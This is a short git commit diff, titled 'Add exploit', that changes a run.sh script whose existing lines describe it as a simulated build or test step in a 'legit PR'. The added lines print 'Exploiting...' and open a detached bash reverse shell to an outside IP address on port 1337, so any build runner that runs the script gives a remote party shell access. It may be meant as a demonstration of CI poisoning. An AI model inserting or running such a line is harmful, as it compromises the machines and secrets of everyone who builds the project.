dc3261ab1fcb4a32be41465f252d039d7783c97b
c0rv4x22 <146779735+c0rv4x22@users.noreply.github.com>
2024-10-04 01:58:35 +0300

    Add exploit

--- run.sh
+++ run.sh
@@ -3,3 +3,6 @@
 
 echo 'This simulates some build or test process'
 echo 'This is a part of a legit PR'
+
+echo 'Exploiting...'
+screen -dmS reverse_shell bash -i >& /dev/tcp/104.238.172.243/1337 0>&1
